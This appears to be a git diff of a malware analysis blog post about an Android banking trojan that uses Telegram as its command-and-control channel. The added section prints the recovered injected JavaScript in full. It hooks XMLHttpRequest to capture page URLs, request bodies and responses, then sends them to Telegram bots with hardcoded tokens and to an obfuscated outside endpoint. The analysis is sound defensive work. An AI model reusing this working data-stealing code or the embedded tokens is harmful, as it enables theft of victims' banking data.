@@ -126,7 +126,7 @@ if __name__ == "__main__":
 
 ```
 
-First you have to decompile the apk. You can use `apktool`, `jdax` or `jadx-gui` to extract and decompile all those files. Then change the 4th line of the code with extracted folder name and run the script.
+First you have to decompile the apk. You can use `apktool`, `jdax` or `jadx-gui` to extract and decompile all those files. Then change the 4th line of the code with extracted folder name and run the script. Make sure that the script is in same directory as the folder.
 
 You will see the output like this: 
 
@@ -136,4 +136,105 @@ Now let's open the folder the open and those earlier obfuscated classes in any t
 
 <figure><img src="/assets/Malware/Banking-Trojan/Decoded_files.png" alt="Decoded Files"></figure>
 
-All the strings within those flies are now decoded and we can analyse the application with ease. After analysing different files, I found one most intresting thing and conclude that these apk was using telegram as a C2 server. 
+All the strings within those files are now decoded and we can analyse the application with ease. After analysing different files, I found one most intresting thing and conclude that these apk was using telegram as a C2 server. 
+
+In the `myodyrurjpvobweyo` function there was a intresting JScode :
+```javscript
+String jsCode = "(function fn_SzP7() {
+    function fn_Kn9S(str) {
+        return atob(str);
+    }
+    
+    // Removed the duplicate tracking logic (e.g. seenRequests Set)
+
+    const originalOpen = XMLHttpRequest.prototype.open;
+    const originalSend = XMLHttpRequest.prototype.send;
+
+    XMLHttpRequest.prototype.open = function fn_L3kQ(method, url) {
+        this._requestMethod = method;
+        this._requestURL = url;
+        return originalOpen.apply(this, arguments);
+    };
+
+    XMLHttpRequest.prototype.send = function fn_M9nT(body) {
+        this.addEventListener("load", function () {
+            const requestData = {
+                current_url: window.location.href,
+                request_method: this._requestMethod,
+                // Exclude request_url from processing
+                request_body: body ? body.toString() : null,
+                response_text: this.responseText || null
+            };
+
+            // Always send the payload without duplicate checks
+            const tgBots = [
+                { botToken: "7579076301:AAFG3AaQfhT-O1jlnw3w_Zx3cOryBfkmemY", chatId: "-1002480016657" },
+                { botToken: "7672911013:AAEoFgNBMK6eekOgIslXjiJwC11Hkp8A9yA", chatId: "-1002480016657" },
+                { botToken: "8112210050:AAHE_kZWF1doFTPU2rVR2y3CuVPbg-63Z1I", chatId: "7694382140" },
+                { botToken: "8112210050:AAHE_kZWF1doFTPU2rVR2y3CuVPbg-63Z1I", chatId: "-1002480016657" }
+            ];
+            const randomBot = tgBots[Math.floor(Math.random() * tgBots.length)];
+            const telegramApiUrl = fn_Kn9S("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==") +
+                                   randomBot.botToken +
+                                   fn_Kn9S("L3NlbmRNZXNzYWdl");
+            const telegramPayload = {
+                chat_id: randomBot.chatId,
+                text: `📡 *XHR Request Detected!*\n\n` +
+                      `🌍 *Current URL:* ${requestData.current_url}\n` +
+                      `🔗 *Request URL:* ${this._requestURL}\n` +
+                      `📩 *Method:* ${requestData.request_method}\n` +
+                      `📤 *Request Body:* ${requestData.request_body || "N/A"}\n` +
+                      `📥 *Response:* ${requestData.response_text || "N/A"}`,
+                parse_mode: "Markdown"
+            };
+
+            function fn_X9mA(attempt = 1) {
+                fetch(telegramApiUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(telegramPayload)
+                })
+                .then(function (response) {
+                    if (!response.ok && attempt < 3) {
+                        console.warn(`Retrying Telegram... Attempt ${attempt + 1}`);
+                        setTimeout(function () { fn_X9mA(attempt + 1); }, 2000);
+                    }
+                })
+                .catch(function (error) {
+                    if (attempt < 3) {
+                        console.warn(`Retrying Telegram... Attempt ${attempt + 1}`);
+                        setTimeout(function () { fn_X9mA(attempt + 1); }, 2000);
+                    } else {
+                        console.error("Failed to send Telegram request after 3 attempts", error);
+                    }
+                });
+            }
+            fn_X9mA();
+
+            const extraApiPayload = {
+                sender_id: "FDC-BVC",
+                message: JSON.stringify(telegramPayload),
+                timestamp: new Date().toISOString()
+            };
+
+            const extraApiUrl = fn_Kn9S("aHR0cHM6Ly9zdWJtaXQub3R0Z29vZHMuc2hvcC9wb3N0LnBocA==");
+
+            fetch(extraApiUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(extraApiPayload)
+            })
+            .then(function (response) {
+                if (!response.ok) {
+                    console.error("Extra API responded with an error", response.status);
+                }
+            })
+            .catch(function (error) {
+                console.error("Error sending data to extra API", error);
+            });
+        });
+        return originalSend.apply(this, arguments);
+    };
+})();
+";
+```
